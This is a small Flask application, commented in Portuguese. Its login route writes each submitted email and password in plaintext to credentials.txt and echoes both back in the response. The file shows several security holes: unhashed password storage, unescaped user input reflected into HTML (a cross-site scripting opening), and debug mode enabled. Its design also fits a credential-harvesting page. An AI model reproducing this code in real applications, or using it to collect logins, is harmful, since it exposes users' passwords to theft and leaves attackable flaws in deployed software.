from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':  # Verifica se o método da requisição é POST
        email = request.form['email']  # Ajustando para o nome correto do campo
        senha = request.form['senha']  # Ajustando para o nome correto do campo

        # Abrindo o arquivo .txt em modo de append ('a') para adicionar novas linhas sem sobrescrever
        with open('credentials.txt', 'a') as file:
            file.write(f'Email: {email}, Senha: {senha}\n')  # Salvando as credenciais no arquivo

        return f'Login recebido! Email: {email}, Senha: {senha}'  # Retorno para confirmação

    return render_template('login.html')  # Renderiza o formulário se for um GET

if __name__ == "__main__":
    app.run(debug=True)
